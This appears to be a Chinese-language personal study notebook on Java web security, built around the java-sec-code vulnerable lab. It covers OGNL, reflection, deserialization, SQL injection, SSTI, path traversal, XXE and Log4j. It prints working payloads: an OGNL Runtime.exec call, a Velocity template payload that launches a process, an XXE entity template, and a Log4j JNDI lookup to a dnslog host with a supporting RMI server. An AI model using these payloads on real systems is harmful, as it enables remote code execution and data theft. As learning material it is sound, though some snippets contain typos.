
## java内存马


## ONGL注入

OGNL具有三要素：表达式（expression）、根对象（root）和上下文对象（context）。

- 表达式（expression）：表达式是整个OGNL的核心，通过表达式来告诉OGNL需要执行什么操作；
- 根对象（root）：root可以理解为OGNL的操作对象，OGNL可以对root进行取值或写值等操作，表达式规定了“做什么”，而根对象则规定了“对谁操作”。实际上根对象所在的环境就是 OGNL 的上下文对象环境；
- 上下文对象（context）：context可以理解为对象运行的上下文环境，context以MAP的结构、利用键值对关系来描述对象中的属性以及值；

###### 使用操作符号
OGNL表达式中能使用的操作符基本跟Java里的操作符一样，除了能使用`+, -, *, /, ++, --, ==, !=, =等操作符之外，还能使用mod, in, not in等。`

###### 容器、数组、对象
OGNL支持对数组和ArrayList等容器的顺序访问。例如：`group.users[0]`

同时，OGNL支持对Map的按键值查找。例如：`#session['mySessionPropKey']`

不仅如此，OGNL还支持容器的构造的表达式。例如：`{"green", "red", "blue"}`构造一个List，`#{"key1" : "value1", "key2" : "value2", "key3" : "value3"}构造一个Map`

你也可以通过任意类对象的构造函数进行对象新建。例如：`new Java.net.URL("xxxxxx/")`

###### 对静态方法或变量的访问
要引用类的静态方法和字段，他们的表达方式是一样的@class@member或者@class@method(args)。
例如：`@com.javaeye.core.Resource@ENABLE，@com.javaeye.core.Resource@getAllResources`

##### payload
```java
@java.lang.Runtime@getRumtime().exec("ls")



```


## java web基础

[java安全初探](https://evilpan.com/2023/04/01/java-ee/)
### Servlet
Servlet是在 Java Web容器中运行的小程序,通常我们用Servlet来处理一些较为复杂的服务器端的业务逻辑。Servlet是Java EE的核心,也是所有的MVC框架的实现的根本！

#### Servlet的定义

定义一个 Servlet 很简单，只需要继承javax.servlet.http.HttpServlet类并重写doXXX(如doGet、doPost)方法或者service方法就可以了，其中需要注意的是重写HttpServlet类的service方法可以获取到上述七种Http请求方法的请求。

![image.png](https://c.biancheng.net/uploads/allimg/210616/14224J192-0.png)

### Filter


### Listener



加载顺序:`Listener->Filter->Servlet`



```java

```

### json

https://javasec.org/javaweb/JSON/FEATURE.html
目前测试的所有JSON库都支持Unicode编码，fastjson支持\x（十六进制）和\（八进制）。

## Java特性
### 反射
反射机制可以用来：

- 在运行时分析类的能力。
- 在运行时检查对象。
- 实现泛型数组操作代码。
- 利用Method对象，这个对象很像C++中的函数指针。
`反射就是在运行时才知道要操作的类是什么，并且可以在运行时获取类的完整构造，并调用对应的方法。`

```java
//正射
Apple apple = new Apple(); //直接初始化，「正射」
apple.setPrice(4);

//反射
Class clz = Class.forName("com.chenshuyi.reflect.Apple"); //根据字符串查找要构建的类
//还可以这样
Class clz_2=com.chenshuiyi.reflect.Apple.class;
Class clz_3=ClassLoader.loadclass("com.chenshuiyi.reflect.Apple");
//内部类需要加上$
Class clz_in=com.chenshuiyi.reflect.Apple$Hello;

Method method = clz.getMethod("setPrice", int.class);  //获取类的方法
Constructor constructor = clz.getConstructor();  //构造方法
Object object = constructor.newInstance();  //从类新建一个示例
//调用方法 method.invoke(方法实例对象, 方法参数值，多个参数值用","隔开);
method.invoke(object, 4);


```


```java
import java.util.Scanner;
public class hello {
    public static void main(String args[]) {
        Scanner s = new Scanner(System.in);
        System.out.println("q".getClass().getName());
        
    }
}
//java.lang.String
```
### 静态代理
```java
public class UserServiceProxy implements UserService {
    private UserService target; // 被代理的对象

    public UserServiceProxy(UserService target) {
        this.target = target;
    }
    public void select() {
        before();
        target.select();    // 这里才实际调用真实主题角色的方法
        after();
    }
    public void update() {
        before();
        target.update();    // 这里才实际调用真实主题角色的方法
        after();
    }

    private void before() {     // 在执行方法之前执行
        System.out.println(String.format("log start time [%s] ", new Date()));
    }
    private void after() {      // 在执行方法之后执行
        System.out.println(String.format("log end time [%s] ", new Date()));
    }
}

```
### 动态代理
https://juejin.cn/post/6844903744954433544
#### JDK动态代理
JDK动态代理主要涉及两个类：`java.lang.reflect.Proxy` 和 `java.lang.reflect.InvocationHandler`
```java
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.util.Date;

public class LogHandler implements InvocationHandler {
    Object target;  // 被代理的对象，实际的方法执行者

    public LogHandler(Object target) {
        this.target = target;
    }
    @Override
    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
        before();
        Object result = method.invoke(target, args);  // 调用 target 的 method 方法
        after();
        return result;  // 返回方法的执行结果
    }
    // 调用invoke方法之前执行
    private void before() {
        System.out.println(String.format("log start time [%s] ", new Date()));
    }
    // 调用invoke方法之后执行
    private void after() {
        System.out.println(String.format("log end time [%s] ", new Date()));
    }
}

```

## 文件系统

![image](https://oss.javasec.org/images/image-20201113121413510.png)

##### 目录结构

```
├── pom.xml //maven的配置文件
└── src
     ├── main
     │   ├── java //java代码的目录
     │   │   └── mygroup
     │   │       ├── controller
     │   │       │   ├── HomeController.java
     │   │       │   └── PersonController.java
     │   │       ├── dao
     │   │       │   └── PersonDao.java
     │   │       └── model
     │   │           └── Person.java
     │   ├── resources //静态资源目录
     │   │   ├── db.properties
     │   │   ├── log4j.xml
     │   │   └── META-INF
     │   │       └── persistence.xml
     │   └── webapp //web应用部署根目录
     │       ├── index.html //因为是静态html文件，不用放到WEB-INF目录下
     │       ├── META-INF
     │       │   ├── context.xml
     │       │   └── MANIFEST.MF
     │       ├── resources //css，js等静态资源是不能放到WEB-INF目录下的，因为WEB-INF下的资源，客户端无法直接访问
     │       │   └── css
     │       │       └── screen.css
     │       └── WEB-INF //jsp都会放到这里，以保证用户无法直接访问jsp，而是通过controller这个目录下的所有内容客户端都无法直接访问，所以不要放静态文件
     │           ├── spring
     │           │   ├── app
     │           │   │   ├── controllers.xml
     │           │   │   └── servlet-context.xml
     │           │   ├── db.xml
     │           │   └── root-context.xml
     │           ├── views
     │           │   ├── edit.jsp
     │           │   ├── home.jsp
     │           │   └── list.jsp
     │           └── web.xml
     └── test
         ├── java
         │   └── mygroup
         │       ├── controller
         │       │   ├── DataInitializer.java
         │       │   ├── HomeControllerTest.java
         │       │   └── PersonControllerTest.java
         │       └── dao
         │           └── PersonDaoTest.java
         └── resources
             ├── db.properties
             ├── log4j.xml
             ├── test-context.xml
             └── test-db.xml
```



![javaweb项目结构](https://atts.w3cschool.cn/attachments/image/20210610/1623317314764573.jpeg)

## 本地命令执行
危险关键字
`Runtime.exec/ProcessBuilder/ProcessImpl`

> 只要在Java的API中的任何一个类只要符合以下条件，我们就可以在Java反序列化的时候触发InvokerTransformer类的transform方法实现RCE：
实现了java.io.Serializable接口；
并且可以传入我们构建的TransformedMap对象；
调用了TransformedMap中的setValue/put/putAll中的任意方法一个方法的类；


## JDBC(Java Database Connectivity)
java数据库的标准api
### 数据库配置信息
传统的Web应用的数据库配置信息一般都是存放在WEB-INF目录下的`*.properties`、`*.yml`、`*.xml`中的,如果是Spring Boot项目的话一般都会存储在jar包中的src/main/resources/目录下。常见的存储数据库配置信息的文件路径如：WEB-INF/applicationContext.xml、WEB-INF/hibernate.cfg.xml、WEB-INF/jdbc/jdbc.properties，一般情况下使用find命令加关键字可以轻松的找出来，如查找Mysql配置信息: `find 路径 -type f |xargs grep "com.mysql.jdbc.Driver"。`

### ssrf
利用file协议读取文件内容（仅限使用URLConnection|URL发起的请求）
利用http 进行内网web服务端口探测
利用http 进行内网非web服务端口探测(如果将异常抛出来的情况下)
利用http进行ntlmrelay攻击(仅限HttpURLConnection或者二次包装HttpURLConnection并未复写AuthenticationInfo方法的对象)

## java-sec-code

搭建了一晚上,idea各种报错,spring一直报错,最终使用jar成功了.....差点紫砂😆

### 命令注入

```java
//将请求映射到/codeinject    
	@GetMapping("/codeinject")
//接收 filepath参数
    public String codeInject(String filepath) throws IOException {
//拼接命令
        String[] cmdList = new String[]{"sh", "-c", "ls -la " + filepath};
//new 一个 ProcessBuilder对象,它被用于启动一个新的进程，以执行前面定义的 shell 命令
        ProcessBuilder builder = new ProcessBuilder(cmdList);
//将错误重定向
        builder.redirectErrorStream(true);
//启动新进程
        Process process = builder.start();
//从进程的输入流里读取输出
        return WebUtils.convertStreamToString(process.getInputStream());
    }
```

字符串拼接导致命令执行

```java
    @GetMapping("/codeinject/host")
    public String codeInjectHost(HttpServletRequest request) throws IOException {

        String host = request.getHeader("host");
        logger.info(host);
        String[] cmdList = new String[]{"sh", "-c", "curl " + host};
        ProcessBuilder builder = new ProcessBuilder(cmdList);
        builder.redirectErrorStream(true);
        Process process = builder.start();
        return WebUtils.convertStreamToString(process.getInputStream());
    }
```

同样的命令拼接,但是参数传递是从请求头host传递,而Servlet容器会对Host字段进行严格的合法性检查, `;`分号会导致400,wp上是 `localhost&ipconfig`但是我还是400   明天用burp试一下😵

```java
    @GetMapping("/codeinject/sec")
    public String codeInjectSec(String filepath) throws IOException {
        String filterFilePath = SecurityUtil.cmdFilter(filepath);
        if (null == filterFilePath) {
            return "Bad boy. I got u.";
        }
        String[] cmdList = new String[]{"sh", "-c", "ls -la " + filterFilePath};
        ProcessBuilder builder = new ProcessBuilder(cmdList);
        builder.redirectErrorStream(true);
        Process process = builder.start();
        return WebUtils.convertStreamToString(process.getInputStream());
    }
```

**SecurityUtil.cmdFilter**的实现

```java
//    private static final Pattern FILTER_PATTERN = Pattern.compile("^[a-zA-Z0-9_/\\.-]+$"); 
    public static String cmdFilter(String input) {
        if (!FILTER_PATTERN.matcher(input).matches()) {
            return null;
        }

        return input;
    }
```

白名单机制,目前来说这个方法是安全的🥰

### 反序列化
https://www.cnblogs.com/LittleHann/p/17800577.html
```java
    @RequestMapping("/rememberMe/vuln")
    public String rememberMeVul(HttpServletRequest request)
            throws IOException, ClassNotFoundException {

        Cookie cookie = getCookie(request, Constants.REMEMBER_ME_COOKIE);
        if (null == cookie) {
            return "No rememberMe cookie. Right?";
        }

        String rememberMe = cookie.getValue();
        byte[] decoded = Base64.getDecoder().decode(rememberMe);

        ByteArrayInputStream bytes = new ByteArrayInputStream(decoded);
        ObjectInputStream in = new ObjectInputStream(bytes);
        in.readObject();
        in.close();

        return "Are u ok?";
    }
```

java的反序列化好难..🤦‍♂️

利用需要三个条件 先去学习反射

-   反序列化入口 
-   目标方法
-   利用链

### SQL注入

>   在MyBatis框架中使用#{}取值时会使用参数化查询的方式访问数据库，在使用${}取值时会使用拼接字符串的方式，从而导致漏洞产生，在MyBatis log的日志中我们看到拼接后的查询语句

#### Vuln01

```java
    @GetMapping("/mybatis/vuln01")
    public List<User> mybatisVuln01(@RequestParam("username") String username) {
        return userMapper.findByUserNameVuln01(username);
    }
```

先来看下fingByuserNameVuln01的实现

```java
public interface UserMapper {

    /**
     * If using simple sql, we can use annotation. Such as @Select @Update.
     * If using ${username}, application will send a error.
     */
// #{} 参数化查询
    @Select("select * from users where username = #{username}")
    User findByUserName(@Param("username") String username);
//拼接查询,存在注入
    @Select("select * from users where username = '${username}'")
    List<User> findByUserNameVuln01(@Param("username") String username);

    List<User> findByUserNameVuln02(String username);
    List<User> findByUserNameVuln03(@Param("order") String order);

    User findById(Integer id);

    User OrderByUsername();

}

```

问题很明显,直接拼接导致的注入

#### Vuln02

findByUserNameVuln02 也是直接拼接

`select * from users where username like '%${_parameter}%'`

### SSTI

```java
    @GetMapping("/velocity")
    public void velocity(String template) {
        Velocity.init();

        VelocityContext context = new VelocityContext();

        context.put("author", "Elliot A.");
        context.put("address", "217 E Broadway");
        context.put("phone", "555-1337");

        StringWriter swOut = new StringWriter();
        Velocity.evaluate(context, swOut, "test", template);
    }
```

采用 `velocity`渲染 

payload 

```
?template=%23set($e=%22e%22);$e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22calc%22)

// urldecode
#set($e="e");$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("calc")
// 利用java反射
```

### 目录穿越

```java
    public static String pathFilter(String filepath) {
        String temp = filepath;

        // use while to sovle multi urlencode
        while (temp.indexOf('%') != -1) {
            try {
                temp = URLDecoder.decode(temp, "utf-8");
            } catch (UnsupportedEncodingException e) {
                logger.info("Unsupported encoding exception: " + filepath);
                return null;
            } catch (Exception e) {
                logger.info(e.toString());
                return null;
            }
        }

        if (temp.contains("..") || temp.charAt(0) == '/') {
            return null;
        }

        return filepath;
    }
```

过滤代码在window下可以使用 `/`绕过

### xxe

#### 外部实体引用

```java
    @PostMapping("/xmlReader/vuln")
    public String xmlReaderVuln(HttpServletRequest request) {
        try {
            String body = WebUtils.getRequestBody(request);
            logger.info(body);
            XMLReader xmlReader = XMLReaderFactory.createXMLReader();
            xmlReader.parse(new InputSource(new StringReader(body)));  // parse xml
            return "xmlReader xxe vuln code";
        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }
    }
```

无回显但是可以dns外带

```xml
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE input [
<!ELEMENT xmen ANY>
<!ENTITY xxe SYSTEM "http://">]>
<input><xmen>&xxe;</xmen></input>
```

### Log4j

```java
    /**
     * http://localhost:8080/log4j?token=${jndi:ldap://wffsr5.dnslog.cn:9999}
     * Default: error/fatal/off
     * Fix: Update log4j to lastet version.
     * @param token token
     */
@GetMapping("/log4j")
public String log4j(String token) {
    if(token.equals("java-sec-code")) {
        return "java sec code";
    } else {
        logger.error(token);
        return "error";
    }
}
```

验证payload

```
${jndi:ldap://wffsr5.dnslog.cn:9999}
```

`${}`为apache中的占位符 一旦在log字符串中检测到${}，就会解析其中的字符串尝试使用lookup查询，因此只要能控制log参数内容，就有机会实现漏洞利用

1.   解析 `${jndi:ldap://wffsr5.dnslog.cn:9999}`
2.   提取到 `jndi:ldap://wffsr5.dnslog.cn:9999`  将该内容作为lookup参数,进行正常的lookup查询
3.   jndi支持多种协议,如rmi,ldap 

>   创建`Server`类：
>
>   ```java
>   public class RMIServer {
>       public static void main(String[] args) {
>           try {
>               Registry registry = LocateRegistry.createRegistry(1099);
>   //创建一个Reference对象，并将其封装在一个ReferenceWrapper中。Reference对象指定了远程对象的类型和位置，其中第一个参数为远程对象的类型，第二个参数为远程对象的位置，第三个参数为远程对象的工厂类。
>               ReferenceWrapper referenceWrapper = new ReferenceWrapper(new Reference("com.ldbmcs.rmi.RmiExecute", "com.ldbmcs.rmi.RmiExecute", null));
>   //将 Hello 与RmiExecute绑定
>               registry.bind("Hello", referenceWrapper);
>           } catch (Exception e) {
>               System.out.println("Server Exception: " + e);
>               e.printStackTrace();
>           }
>       }
>   }
>   ```
>
>   创建对象： 
>
>   ```java
>   public class RmiExecute {
>       static {
>           System.out.println("Hello, World");
>       }
>   }
>   ```
>
>   接着，我们在测试类`VulnerabilityTest`中修改代码如下：
>
>   ```java
>   public class VulnerabilityTest {
>       private static final Logger LOGGER = LogManager.getLogger();
>   
>       public static void main(String[] args) {
>           String test = "${jndi:rmi://localhost:1099/Hello}";
>           LOGGER.error("Test:{}", test);
>       }
>   }
>   ```
>
>   分别启动`RMIServer`和`VulnerabilityTest`，我们可以看到在`VulnerabilityTest`中打印出：
>
>   ```text
>   Hello, World
>   ```
>
>   ![img](https://gitee.com/leiye87/typora_picture/raw/master/20230428093351.png)



## java反序列化
#java反序列化 

https://mvnrepository.com/  查找maven依赖
`ctrl alt b`查找接口的实现

入口类: 
- 实现了serialize接口
- 重写了readObject方法
- 接收任意对象作为参数
中间类:
- 实现了serialize接口
- 接收集合类型

最终类:
- 命令执行或文件读取

